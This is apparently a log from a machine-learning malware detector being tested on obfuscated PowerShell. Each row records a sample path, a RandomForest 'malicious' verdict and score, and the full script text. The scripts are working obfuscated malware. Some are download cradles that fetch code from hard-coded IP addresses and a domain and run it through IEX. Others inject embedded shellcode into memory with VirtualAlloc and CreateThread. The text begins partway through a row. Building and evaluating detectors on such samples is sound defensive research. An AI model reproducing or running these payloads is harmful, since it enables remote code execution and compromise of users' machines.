[SYst','8.121.170.12:3031',';rUTWC.P','acHE]::DEFAUl','Y.Cr','5C1','C','M','.NET','/','dex.aspV82)))',' NT ','iCEPo','rv','tt','1r)','0;[cHaR[]]','T','R','rUTu=C1rMozil','Wn','0) li','548184','ET.SE','Ial','W','nC1','or',':11.','v','r','7.0; r','h]};IEX','NE','Ng(V82h','eNt','p://1','64; ','EM.Net.Web','OXy;rUTw','eW-OBJeC','050796b649e8','UT_-bX','ClIeNT;','0ea7bb98','r','Ers.Ad','3','ed')).RepLace('rUT','$').RepLace(([cHaR]86+[cHaR]56+[cHaR]50),[STRiNg][cHaR]34).RepLace('1Ue','|').RepLace('C1r',[STRiNg][cHaR]39) |&amp;( $shElLID[1]+$sHeLLiD[13]+'X')",malicious,TP
2026-07-13 17:14:31,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3507.ps1,custom-ps-ml,UNKNOWN,4f3c0380-761a-4eef-9fad-a7385f297701,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,1318,2251.86,"(((\""{22}{7}{81}{38}{64}{50}{17}{82}{3}{25}{60}{84}{51}{73}{75}{55}{9}{74}{14}{89}{13}{63}{85}{70}{10}{27}{28}{69}{47}{52}{65}{24}{90}{31}{71}{30}{76}{87}{77}{57}{19}{80}{29}{11}{20}{68}{88}{58}{86}{16}{36}{66}{1}{41}{40}{18}{21}{33}{23}{83}{56}{78}{45}{5}{37}{34}{2}{59}{62}{49}{46}{67}{61}{48}{8}{44}{0}{43}{15}{42}{4}{53}{6}{12}{79}{39}{35}{54}{32}{26}{72}\"" -f')','hU','C.','ndows NT 6.1','XOrJnkK[','([Ch','K','-ObjEcT','8080/index.as','U','ku);J','::De','.Len','DERs.ADD','n','%{Jnk_','JnkK=UH6W?','EBCLIent;Jnku=UH6Mozilla/5.0 (','.k:l','Ne','FaULtNEtW','ET','JnkWC=NEW','I','tEm.NEt','; WOW64; Tr','UH','n','kWc.P','CaChe]','AUltWEBP','equE','6','BxUH6;Jnk','w',' (Jnkb-JoiNU','9','aR[]](Jnk','STEM.','IEX','_AJ^tG&amp;!','g[5o','-b','cXz','piXp))',']]Jnkb=','p://192.','OxY =','8:','STrinG(iXphtt','t.W','; rv:',' [','Jnki++%Jnk','H','cko','A','.','ALS','DoWNL','ident','12','OaD','(','NE','SYS','nCaNWuu12','168.52.','o','r','gentUH6,Jn','ST]::DeF','6)','11','H6;J','.0) like Ge','Roxy;JnkWC','[SYStem','R[','GTh]};','t.CRedenTial',' Sy','Wi','=0;[Ch','/7.0','UH6User-A',';','.PRoxy.CrEDENTIAls = ','RkCRedEnTI','kwc.Hea','.WEbR')) -CrePlaCE'Jnk',[CHAR]36-REpLAcE 'UH6',[CHAR]39  -REpLAcE ([CHAR]99+[CHAR]88+[CHAR]122),[CHAR]124 -CrePlaCE([CHAR]105+[CHAR]88+[CHAR]112),[CHAR]34-CrePlaCE  'NWu',[CHAR]96) |iEx",malicious,TP
2026-07-13 17:14:37,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3514.ps1,custom-ps-ml,UNKNOWN,47b036ec-ae08-4d75-b0bd-ef0c91972be0,DESKTOP-BAC9DBQ,malicious,0.9941,RandomForest,2801,1940.97," &amp;( $EnV:COMSpec[4,15,25]-joIN'') ( (((\""{4}{14}{9}{34}{18}{41}{6}{11}{5}{23}{8}{13}{24}{25}{0}{17}{33}{19}{44}{3}{38}{2}{39}{22}{27}{1}{36}{40}{21}{32}{42}{45}{15}{37}{28}{46}{7}{31}{26}{35}{29}{43}{12}{30}{20}{16}{10}\""-f ',0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x','0x01,','x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0','1,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc','5Rac = C7i[DllImport(0Mokernel32.dll0Mo)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint ','ion 5Rac -Name 0MoWin320M','meter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(0Momsvcrt.dll0Mo)]public static extern I','0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x','0,0x6','hreadAttri','5Rax,0,0,0);for (;;){Start-sleep 60};','ntPtr memset(IntPtr dest, uint src, uint count);C7i;5Raw = Add-Type -memberDefinit','rtualAlloc(0,0x','0,0x89,','flProtect);[DllImport(0Mokernel32.dll0Mo)]public static extern IntPtr CreateThread(IntPtr lpT','xe0,0xff,0xd5,0x97,0x6a,0x05','};5Raw::CreateThread(0,0,','61,0x7c,0x02,0x2c,0x20','es, uint dwStackSize, IntPtr lpStar','0,0x50,0x8b,0x','size,0x40);for (5Rai=0;5Rai -le (5Rasc.Length-1);5Rai++) {5Raw::memset([IntPtr](5Rax.ToInt32()+5Rai), 5Rasc[5Rai], 1)','0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd',',0x4b,0x8','o -namespace Win32Functions -passthru;[Byte[]];[Byte[]]5Rasc = 0xfc,0xe8,0x89,0x00,0x00,0x0','0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c',',0x8b,0x52,0x14,0x8b,0x72',',0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0','b,0x58,0x1c,','0,0xa8,0x01,0x64,0x68,0x02,0x00,0x30,0x39,0','xc3;5Rasize = 0x1000;if (5Rasc.Length -gt 0x10','1000,5Ra','68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58','5,0xb8,0x90,0x01,0x00,0x00,0x29,0',',0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd','but','xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0','0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x4',',0x68,0xc','1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0','xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c','4,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,','tAddress, IntPtr lpPara','x','00){5Rasize = 5Rasc.Length};5Rax=5Raw::Vi','48,0x18,0x8b,0x58,0x20,0x0','c4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0','x89,0xe6,0x6a,0x10,0x56,0x57,'))-cREPlACe  ([CHAR]53+[CHAR]82+[CHAR]97),[CHAR]36-cREPlACe 'C7i',[CHAR]39-cREPlACe ([CHAR]48+[CHAR]77+[CHAR]111),[CHAR]34))",malicious,TP
2026-07-13 17:14:44,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3559.ps1,custom-ps-ml,UNKNOWN,14322aad-4c76-4651-b888-1a37c1db2775,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3087,2114.57,"&amp;( $PsHOme[21]+$PshOMe[30]+'x')(((\""{3}{7}{62}{1}{5}{25}{57}{27}{26}{54}{13}{35}{4}{53}{65}{49}{10}{69}{59}{14}{18}{67}{56}{50}{29}{21}{40}{71}{36}{31}{44}{23}{30}{28}{46}{12}{60}{22}{2}{63}{15}{61}{6}{19}{41}{39}{48}{37}{43}{32}{8}{11}{17}{55}{52}{58}{38}{24}{64}{0}{68}{47}{51}{34}{9}{66}{45}{20}{16}{33}{70}{42}\"" -f '0x7c,0xf3,0xb9,0','t flAllocationType, uint flProtect);[DllImport(r','d7,0xb6,0x1b,0x53,0xf3,0x93,0xf8,0xfa,0xa2,0x79,0xa','EGHTeh = DrH[DllImport(rmkkernel32.dllrmk)]pub','f,0x9d,0xd9,0xed,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb','mkkernel32.dllrmk)]public static extern IntP','0xb1,0','lic static extern IntPtr VirtualAlloc','6,0x06','x9c,0xb4,0x63,0x','4a,0x61,0xb5,0x0b,0xb5,0x9',',0xe','f,0xc3,0x9c','IntPtr memset(IntPtr dest, uint src, uint count);DrH;EGHw = Add-Type -memberDefinition EGHTeh -Name rmkWin32rmk -namespace Win32Functions -pass','x7f,0x74,0xac,0x5b,0x0b,','xa9,0xd6,0x1e,0x56,0xa6,0x61,0x6c,0x64,0x69,0xda,0xfa,0','.Length};EGH3uZS=EGHw::VirtualAlloc(0,0x1000,EGHg,0x40);for (EGHi=0;EGHi -le (EGHz.Le','d,0xc5,0x7e,0xbe,','0x26,0x1c,0x2f,0x5','xb7,0x79,0x24,0x3e,0x62,0x17,0x21','h -gt 0x1000){EGHg = EGHz','b5,0x67,0x40,0x8c,','x5f,0x74,0x','4','3c,0x','tr CreateThread(IntPtr lpThread','reationFlags, IntPtr lpThreadId);[DllImport(rmkmsvcrt.dllrmk)]public static ex','ss, IntPtr lpParameter, uint dwC','0x2b,0x33,0x64,0x6a,0x12,0xfc,0x97,0x72,0x52,0x3a,0x48,0x01,0xaa,0x39,0xf5,0x12,0x69,0x40,0x21,0x96,0x6a,0xe2,0xa2,0x00,0x57,0x13,0','6,0x',',','0x','x0','ngth-1);EGHi++) {EGHw::memset([IntPtr](EGH3','5,0xa9,0x24,0x1f,0x05,0','thru;[Byte[]];[Byte[]]EGHz = 0xba,0x4e,0xa7,0xb',',','xf9','6b,0x79,0x77,0x22,0x','x43,0x26,0x93,0x2b,0x92,0x0a,0x1a,0xcd,0xc4,0x22,0x','0x68,0x98,0xe5,0xd8,0xb0,0x13,0xb5,0xcd,0xb0,0x',',0xa8,0x4d,0x40,0x28,0','ateThread(0,0,EGH3uZS,0,0,0);for (;;){Start-sleep 60};',',0xa1,0x6d,0x6c,0x02,0x68,0','84,0xc','gt','x66,0xd6,0x1c,0x1','9,0x00,0xd5,0xd7','4d,0x42,0xa4,0x92,0x2d,0x32,0x4c,0','c,0x31,0x56,0x0f,0x03,0x56,0x41,0x45,0x','x35,0x97,0xc',',0x9d,0x99,0x40,0xd8,0xf7,0x4e,0xc2,0xb0,0xf','x5f,0xd2,0x69,0x84,0x11,0x13,0x07,0x96,0xc5,0xd3,0x52,0xc4,0x43,0xeb,','1,0x47,0x83,0','tern ','0x94,0x4f,0xf4,0x5f,0x58,0x5a,0x70,0','34,0x4e,0x9b,0x34,0','Attributes, uint dwStackSize, IntPtr lpStartAddre','0x48,0x63,0x','3f,0',',0x7b,0x03,0xd2,0x71,0xf0,0x3f,0','xc4,0xe2,0xc4,0xfd,0x2b,0xd9,0xb1,0x92,0xd2,0xe2,0xc1,0xbb,0x10,0xb6,0x91,0xd3,','(IntPtr lpAddress, uint dwSize, uin','e,0x03,0xb4,0x22,0x0f,0xa6,0xbe,0xce,0x44,0xdb,0x9c,0x86,0','15,0x75,0x13,0x0a,0xba,0x86,0x76,0x01,0x73,0x13,0x39,0x7d,','xee,0xf','d0,0xd8,0xc2,0x8d,0xe0;EGHg = 0x1000;if (EGHz.Len','9,0xca,0xd7,0x7d,0x4a,0x59,0x95,0xa9,0x7d,0xea,0x10,0x8c,0xb0,0xeb,0x09,0xec,0xd3,0x6f,0x50,0x21,0x','x7d,0x2a,0x99,0xb9,0x15,0x8a,0xf9,0xe','a,0x45,0x6c,0x','uZS.ToInt32()+EGHi), EGHz[EGHi], 1)};EGHw::Cre','c0,0x0d,0xef,0x91,0x56,0x06,0xb6,0x31,0x58,0xcb,0xc2,0x7b,0x42,0x08,0xee,0x32,0xf9,0xfa')).rEpLACE('EGH',[sTRING][ChAR]36).rEpLACE(([ChAR]68+[ChAR]114+[ChAR]72),[sTRING][ChAR]39).rEpLACE(([ChAR]114+[ChAR]109+[ChAR]107),[sTRING][ChAR]34) )",malicious,TP
2026-07-13 17:14:59,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\358.ps1,custom-ps-ml,UNKNOWN,ce88105c-f5d9-430d-8454-6d9721dd5200,DESKTOP-BAC9DBQ,malicious,0.9711,RandomForest,1724,1995.01,"((\""{46}{31}{15}{40}{103}{116}{54}{118}{110}{55}{48}{73}{80}{67}{6}{74}{1}{87}{121}{2}{47}{113}{21}{4}{37}{101}{64}{60}{78}{51}{75}{69}{120}{42}{88}{115}{29}{18}{105}{53}{41}{70}{108}{19}{93}{36}{26}{66}{84}{79}{27}{30}{85}{100}{107}{82}{5}{56}{62}{92}{13}{50}{44}{14}{16}{52}{10}{20}{8}{34}{83}{114}{86}{94}{11}{98}{122}{3}{32}{81}{57}{91}{12}{0}{71}{77}{97}{7}{9}{106}{25}{45}{33}{59}{63}{89}{39}{72}{17}{43}{102}{58}{119}{61}{96}{99}{24}{109}{90}{28}{76}{117}{104}{49}{65}{112}{38}{123}{95}{35}{23}{68}{22}{111}\"" -f 'R;Pi8I=','STE','ENt;Pi','*~Y{2fQ6CEqIO','dRMozilla/5.','DEfaul','-OBJecT ',']','ac',']P','.CredEN','K','Vd','ROxY.CReD','SYstem','r','.','h','E','n','TiALC','=V','R','NVd','.','([','Pi8u);Pi8WC','SySTe','%{P','dR;Pi8WC.HEAD','M.Net.','NeT.Se','rX}h','HAr','H','-JOI',',','0 (Windows NT','H]};I','STr','VICeP','(VdR','v:11.0) ','ttp://','NtIAls = [','c','[SYStEm.','8','CONtiNUe = 0','i8K[P','e','n','NET','ADD','::','CT100','tWEBPR','U','a','[]](P','64;','veries.com','oxy;','i','1; WOW','i8i++%','.PRoxy','eW','RVd','7.0','Use','0;[ch','InG(n7r',';','Sy','t/','i','a',' Tride','[','Pi8WC=N','70',':','E]::DeFaultNet',' = ','WeBRequESt','n','M.N','like Geck','8wC.DownLoAD','spn7r)))h70','F:y!7D','Pi8Wc.P','tVdR','tiAlS;Pi8','8B','/i','r[','=VdRVjGe','ndex',']',' 6.','am','oiNTMANAG','rP','rS.','i8b=',':','r-Age','a','PE',')','Pi8k.LEnGT','u','WorkCREde','oV','ER]','8_-BXo','EX','zonsdeli','; r','eT.WebCLi','9c_oMP','EX (Pi')).RePLacE(([ChaR]80+[ChaR]105+[ChaR]56),[strInG][ChaR]36).RePLacE(([ChaR]110+[ChaR]55+[ChaR]114),[strInG][ChaR]34).RePLacE('h70',[strInG][ChaR]124).RePLacE(([ChaR]50+[ChaR]102+[ChaR]81),[strInG][ChaR]96).RePLacE('VdR',[strInG][ChaR]39) |. ((gV '*mdR*').NAme[3,11,2]-jOIn'')",malicious,TP
2026-07-13 17:15:07,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3589.ps1,custom-ps-ml,UNKNOWN,ccdc2173-0ffa-4db4-b502-f68b867066a1,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3092,2060.47," (((\""{17}{57}{9}{6}{24}{48}{69}{34}{36}{72}{26}{61}{39}{54}{10}{59}{64}{43}{12}{66}{31}{62}{70}{53}{16}{11}{32}{30}{8}{18}{35}{63}{68}{0}{58}{22}{20}{51}{40}{19}{49}{60}{4}{47}{55}{56}{25}{27}{50}{29}{45}{67}{46}{33}{1}{3}{71}{7}{2}{37}{41}{13}{23}{14}{42}{21}{5}{28}{44}{38}{15}{65}{52}\"" -f'8,0xae,0x1f,0x01,0xee,0x25,0x13,0xee,0x64,0x61,0x37,0xf1,0xa','ad,0x6f,0xb3,0','xd1,0xbb,0x39,0x0a,0xa7,0xd5,0xf9;p3vg = 0x100','x57,0x3b,0xd0,0xab,0x97,0xab,0xd0,0x2b,0xce,0xa1,0xd0,0x43',',0x99,0x','vz.Length-1);p3vi++) {p3vw::me',' flAllocationType, uint flProtect);[','c0,0x46,0xee,0x22,0','b,0xd8,0xd9,0x19,0x0a,0xc8,0x4f,0x12,0x55,0xca,0x',' IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint','svcrt.dllBAJ)]public static ext','7,0x70,0xde,0xf2,0x55,0x61,0x55,0x76,0x72,0x8','n32BAJ -names','0);fo','0;p3vi -','r (;',',0x79,0xf','p3vseo = ouz[DllImport(BAJ','6e,0xf7,0xed,0x43,0x69,0x14,0xcb,0x1a,0x02,','x32,0x8',',0x4c,0xce','e (p3','0x43,0x7a','r (p3vi=','DllImport(','de',', uint dwCreatio',',0xa5,0x78,0xd2,0x8e,0x05,0x29,0xba,','mset([IntPtr](p3v8NW.ToInt32()+p3vi), p3vz[p3vi], 1)};p3vw::CreateThread(','xb0,0x67,0xe3,0x8d,0x3d,0xb2,0x89,0x8d,0xb6,0x31,0x6','xbe,0x1c,0x4a,0x9b,0xa3,0xed,0x1e,0x74,0xaf,0x40,0x8f,0xf1,0xe5,0x58,0x24,0x49,0xe','xbe,0x5a,0xc4,0x97,0xb4,0xdb,0xd1,0xd9,0x74,0x24,0xf4','6,0xde,0x3d,0xa4,0xa9,0xdf,0x6e,0x94,0xa8,0x63,0x6d,0xc9,0x0a,0x5a,0','0,0xa0,0x4a,0x19,0x45,0x4f,0xdd,0x4e,0xf1,0x4d,0x38,0xb8,0x5e,0x','hread(IntPtr lpThrea','0xee,0xa7,0x9c,0','dAttributes, uint dwStackSize, IntPtr lpStartAdd','0;if (p3vz.Length -gt 0x1000){p3vg','NW,0,0,0);fo','tPtr lpThreadId);','c2,0x38,0x6b,0xca,0x8f,0x9b,0x12,0x4b,0x75,0x4d,0x2a,0x8b,0xd6,0',' = p3vz.Length};p3v8NW=p3vw::VirtualAlloc(0,0x1000,p3vg,0x4','l','nt count);ouz;p3vw = Add-Type -memberDefinition p3vseo -Name BAJWi','0,0,p3v8','d,0x43,0x3f,0x3f,0x7d,0x','d','46,0x50,0x0c,0x32,0xc1,0xd8,0xc5','BAJkernel32.dllBAJ)]publi','e,0xc7,0xfa,0x27,0xa3,0x85,0x92','0xc4,0x89,0x16,0xda,0xe6,0x43,0x3f,0x70,0x09,0x3a,0x17,0xec,0',',0x','ep 60};','55,0x26,0x62,0x48,0x81,0x24,0x8d,0xb1,0x51,0x49,0x07,0x54,0x60,0x49,0x73,0x1c,0xd2','[DllImport(BAJm',',0x9c,0x16,0x1f,0xfc,0x59,0x88,0xde,0xff,0x99,0x80,0x24,0xab,0xc9,0xba,0x8d,0xd4,0x81,0x3a,0x32,0x01,0x3f,0x3e,0xa4,0x6a',',0x68,0x41,0x39,0x03,0x6b,0x42,0x40,0x68,0xe2,0xa4,0x12,0x','kernel32.dllBAJ)]public static extern','9,0x19,','ern IntP',',0x84,0x8e,0x35,0x62,0x83','nFlags, In',',0','xc2,0x','tr memset(IntPtr dest, uint src, ui',';){Start-sle','pace Win32Functions -passthru;[Byte[]];[Byte[]]p3vz = 0','33,0xcf,0x0a,0xdf,0x95,0x','3f,0x47,0x32,0x2b,0xf0,0xba,0x4a,0x6b,0x36,0x25,0x39,0x85,0x45,0xd8,0x3a,0x52,0x34,0x06,0xce,0x41,0x9e,0xcd,0x6','c static extern IntPtr CreateT','x5a,0x2b,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x72,0x0f,0x03,0x72,0x',',0xb6,0x91,0x82,0x76,0xb9,0x0f,0xb7,0x2b,0x2c,0xb0,0xee,0x98,0xe7,0xd8,0x0c,0xc7,0x','ress, IntPtr lpParameter'))-rEpLAce ([chaR]111+[chaR]117+[chaR]122),[chaR]39 -CRepLace([chaR]66+[chaR]65+[chaR]74),[chaR]34-CRepLace  ([chaR]112+[chaR]51+[chaR]118),[chaR]36) |&amp; ( $psHoME[4]+$pShOMe[30]+'X')",malicious,TP
2026-07-13 17:15:11,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3611.ps1,custom-ps-ml,UNKNOWN,dd523629-ced2-4626-9501-2d3b6bca64a5,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3885,2162.16,"((\""{10}{81}{58}{60}{22}{68}{56}{62}{76}{14}{2}{44}{53}{12}{17}{35}{88}{0}{77}{86}{3}{50}{85}{84}{71}{89}{11}{21}{87}{74}{6}{18}{57}{39}{69}{66}{45}{59}{4}{64}{34}{25}{36}{1}{29}{33}{73}{16}{31}{8}{19}{15}{40}{42}{49}{65}{41}{90}{20}{78}{7}{48}{43}{9}{47}{51}{32}{67}{46}{28}{54}{52}{24}{26}{83}{55}{91}{30}{37}{80}{72}{38}{75}{79}{70}{63}{82}{13}{27}{5}{61}{23}\"" -f'4,0x58,','xe0,0x9e,0x50,0xdf,0x','tr lpThreadId);[DllImport(DvEmsvcrt.dllDvE)]public static extern IntP','1,','0xb7,0x82,0x79,0x74','.0cehpowershellDvE;iex DvE&amp; ZTRYIr ZTRWUNH ZTR','bb','0','9a,0x1a,0xbc,0x9a,0xf2,0xb2,0xda,0x50,0x03,0x23','f,0x4d,0xc5,0x74,0x04,0x6d,0x30,0x1e,0','ZTR','0x5b,0x75,0x8c,0x4','berDefinition ZTRm','ndowsPowe','ter, uint dwCreationFlags, IntP','1,0x8e,0x9f,0xbc,','x','gi -Name DvEWin32DvE -namespace Win32Functions -passthru;[Byte[]];[Byte[]]Z',',0x68,0xcd,0x67,',',0x52,0xf1,0x6d,0xda,0xc8,0x69,0x3e,0x6b,0xd7,0x6e,0x41,0x46,0x26,0xab,0xee,0x3a,0x1a,0x18,0x42,0xd5,0xa6,0xc8,0x1d,0x82,0x28,0x2','0x22,0xe1,0xaf,0x8b,0x5d,0x37,0xb0,0','a,0xd1,0xa3,0xa3,0x4b,0x4a,0x97,0xa2,0xcf,0x91,0xc4,0x04,0x','alAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(DvEkernel32.dllDvE)','e{;iex DvE&amp; powershell ZTRWUNH ZTReDvE;}','9e,0x2f,0xfb,0','d4,0x15,0xa','x81,0xde,0x4f,0x35,0x44,','rShellcehv1',',0xc3,0x','60,0xe4,0x76,0xfb,0x29,0xbe,0x17,0x5a,0x94,0x1','lAlloc(0,0x1000,ZTRg,0x40);for (ZTRi=0;ZTRi -le (','8d,0xb7,0x',',0x20,0x70,0x3d,0xd3,0x7e,0xdc,0xee,0x82,0xe8,0xcf,0x16,0x33,0x92,0xf','1,0x27,0xbc','x','TRz = 0xbe,0xf1,0xf5,0xe8,0x9a,0xda,0xd4,0xd9,0x74','d,0x0f,0','ZTRz.L','CreateThread(0','7f,0x6d,0x2c,0x1e,0xf4,0x45,0xda,0xa','0xca,0x62,0x73,0x29,0xbc,0x93,0x73,0xa9,0xd4,0x10,0x73','x06,0x38,0xf0,0x6',',0x','x18,0x6e,0x52,0xb','tr memset(IntPtr dest, uint src, uint count);sSgsSg;ZTRw = Add-Typ','x21,0x18,0xd6,0x4f,0x66,0x9f,0x09,0x3a,0x9e,0xe3,0xb4,0x3d,0x65,0x99,0x62,0xcb,0x7d,0x39,0xe0,0x6b,0x59,0xbb,0x25,0xed,0x2','xc3,0xc6,0xa4,0x7a,0xe1,0x87,0x51,0x5c,0x9d,0xe7,0x2f,0xfc,0x0b,0xf7,0x85,0x6b,0xf3,0x6f,0x26,0x7c,0xf3,0x6f,0x4e,0x7c,0xf3,0x2f,0x8e,0x2f,0x9b,0xf7,0x2a,0x9c,0xbe,0xf7,0xe6,0xb0,0x13,0x5b,0x80,0x50,0xc4,0x33,0x92,0xbe,0xea','x10,0x9b,0xe5,0x77,0x65,0xa8,0x19,0x88,0xec,0x2f,0x73,0x8c,0xbe,0xc5,0x9c,0xda,0x56,0x6f,0xe4,0','xea,0x4c,0x43,0x4e,0xb9,0xe3,0xd0,0','a9,0','0x70,0x12,0x03,0','x7c','f3,0x4b,0xdc,0x35,0x3b,0x3e,0x07,0x6d,0x78,0x','e -mem','c1,0xe8,0x82,0xd1,0x73,0x9d,0xb0,0x29,0xae,0x1b,0xf4,0xa2,0x9c,0xaf,0x',' 0x1000){ZTRg = ZTRz.L','ic extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint d','0x68,0x01,0x44,0x','gZTRmgi = sSgsSg[DllImport(DvEkernel32.dllDvE)]public','a,',' static extern IntPtr Virtu','eDvE}els','wStackSize, IntPtr lpStartAddress, IntPtr','m.Text.Encoding]::Unicode.GetBytes(ZTRoT20));ZTRWUNH = DvE-e DvE;if([IntPtr]::Size -eq 8){ZTRYIr = ZTRenv:SystemRoo',',0','x24,0','3,0x0d,0','0,0',']public stat','1,0xdc,0x97,0x2','r (;;){Start-sleep 60};sSg;ZTRe = [System.Convert]::ToBase64String([Syste','0x45,0x5e,0xf4,0x4f,0x6a,0x15,0x58,0x7b,0','++) {ZTRw::memset([IntPtr](ZTRo8Y.ToInt32()+ZTRi), ZTRz[ZTRi], 1)};ZTRw::',',0x77,0xcd,0','x17,0xef,0xc3,0x47,0x87,0x84,0x9e,0x5b,0x2c,0xd6,0x0f,0xdc,0xd1,0xaf,0x2e,0xcd,0x44,0x',',0,ZT',' lpParame','0x2b,0x','x59,0xe8,0x7e,0x1c,0x0a,','Ro8Y,0,0,0);fo','ength-1);ZTRi','oT20 = sS','t + DvEcehsyswow64cehWi','0x13,0x9e,0x07,0x80,0x6b,0xf0,0x57,0xc2,0xba,0x3f,0x98;ZTRg = 0x1000;if (ZTRz.Length -gt','x12,0x83,0x31,0xf1,0x0a,0x6f,0x4d,0x12,0x48,0x90,0xad,0xe3,0x2d,0x18,0x48,0xd2,0x6d,0x7e,0x19,','x70,0','c9,0xb1,0x57,0x3','f1,0x59,0x19,0x45,0x36,0x87,0xd0,0',',0x24,0xf','xf9,','a,0x69,0xf8,0x02,','ength};ZTRo8Y=ZTRw::Virtua')).repLAcE('DvE',[strInG][cHAR]34).repLAcE(([cHAR]99+[cHAR]101+[cHAR]104),[strInG][cHAR]92).repLAcE('ZTR','$').repLAcE(([cHAR]115+[cHAR]83+[cHAR]103),[strInG][cHAR]39)|&amp;( $enV:CoMspec[4,26,25]-JOiN'')",malicious,TP
2026-07-13 17:15:24,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3646.ps1,custom-ps-ml,UNKNOWN,b90bd6bd-a8eb-46a0-a428-df19ffdc39d5,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2934,2040.85," (((\""{22}{19}{29}{6}{11}{18}{21}{28}{38}{24}{47}{7}{33}{41}{35}{13}{45}{15}{37}{48}{3}{1}{26}{34}{8}{43}{46}{23}{5}{30}{31}{40}{16}{39}{32}{9}{42}{20}{0}{25}{4}{14}{10}{17}{2}{44}{27}{36}{12}\""-f'5,0x97,0x45,0xbf,0xd0,0x8b,0x31,0x4f,',',0x5d,0xd5,0xf0,0xeb','xd3;uBDg = 0x1000;if (uBDz.Length -gt 0x1000)','fd,0xea','c6,0x26,0xa9,0x17,0x07,0xa7,0x29,0x','x4c,0x11,0x38,0x6e,0xc5,0x61,0x1f,0xaa,0x8e,0x32,0','rotect);[DllImport(sMvker','DllImport(sMvmsvcrt.dllsMv)]public stati','x26,0x4b,0x8f,0x6d,0x36,0x8b,0x37,0x8e,0x4d,','0x1f,0xb8,0x44,0xee,0x40,0xd8,0x66,0x24,0xe9,0x72,0x89,0x91,0x41,0xea,0x30,0xb8,0x1a,0x8b,0xbd,0x16,','0x0b,0xd9,0x9a,0x67,0x64,0xe7,0xc5,0x40,0x2b,0x18,0x20','nel32.dllsMv)]publi',' {uBDw::memset([IntPtr](uBDcqR.ToInt32()+uBDi), uBDz[uBDi], 1)};uBDw::CreateThread(0,0,uBDcqR,0,0,0);for (;;){Start-sleep 60};','d9,0x74,0x2','4e,0x4d,0xa7,0x41,0x36,0x35,0xf4,0x74,0x39,0xe0,0x68,0x25,0xac,','31,0x56,0x0f,0x03,0x56,0x54,0x8f,0x76,0xa8,0x82,0','0xa8,0x2b,0xde,0xa',',0x51,0x17,0xcf,0x0c,0x27,0x79,0','c static extern IntPtr C','DllImport(sMvkernel32.dllsMv)]public','6,0x9','reateThread(IntPtr ','uBDMnxY = cH5[','9,0','eter, uint dwCreationFlags, IntPtr lpThreadId','0xaf,0xf6,0x97,0x50,0x05,0x9c,0x17,0xc5,0xa2,0x37,0x40,0x71,0xa9,0x6e,0xa6,0xde,0x52,0x45,0xbd,0xd7,0x',',0x9a,0x08,0xf8,0xbe,0x73,0x46,0xaf,0x2e,0xf0,0x12,','uBDw::VirtualAlloc(0,0x1000,uBDg,0x40);for (uBDi=0;uBDi -le (uBDz.Length-1);uBDi','lpThreadAttributes, uint dwStackSize, IntPtr lpSt',' static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flP','x3e,0xeb,0x6a,0x94,0x3f,0xeb,0xd5,0x49,0x9a,0x67,0xfb,0x9e,0x97,0x25,0x93,0x53,0x9a,0xd','5,0x63,0xfc,0xad,0xa6,0x51,0xa3,0x05,0x21,0xd9,0x2c,0x80,0xb6,0x1e,0x07,0x74,0x28,0xe1,0xa8,0x85,0x60,0x25,0xfc,0xd5,0x1a,0x8c,0x7d,0xbe,0x','8,0x3e,0xe8,0x4e,0xfe,0x10,0x5e,0x01,0xaf,0xd0,0x0e,0xe1,','c extern IntPtr memset(IntPtr 